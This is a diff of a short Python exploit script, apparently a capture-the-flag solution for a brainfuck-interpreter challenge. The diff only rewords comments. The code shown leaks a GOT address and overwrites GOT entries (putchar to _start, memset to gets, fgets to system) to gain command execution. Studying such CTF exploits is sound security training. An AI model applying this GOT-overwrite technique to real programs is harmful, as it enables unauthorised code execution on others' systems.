@@ -16,9 +16,9 @@ fgets_got = elf.got['fgets']
 p = 0x0804A0A0
 
 payload = '<' * (p-putchar_got) + '.' + '.>.>.>.>' + '<' * 4 # leak the putchar_got's addr
-payload += ',>,>,>,>' + '<' * (putchar_got - memset_got + 4) # bitwise overlay address(putchar->_start)
-payload += ',>,>,>,>' + '<' * (memset_got - fgets_got + 4) # bitwise overlay address(memset->gets)
-payload += ',>,>,>,>' + '.' # bitwise overlay address(fgets->system)
+payload += ',>,>,>,>' + '<' * (putchar_got - memset_got + 4) # change the address bit by bit(putchar->_start)
+payload += ',>,>,>,>' + '<' * (memset_got - fgets_got + 4) # change the address bit by bit(memset->gets)
+payload += ',>,>,>,>' + '.' # change the address bit by bit(fgets->system)
 
 io.recvuntil('type some brainfuck instructions except [ ]\n')
 io.sendline(payload)
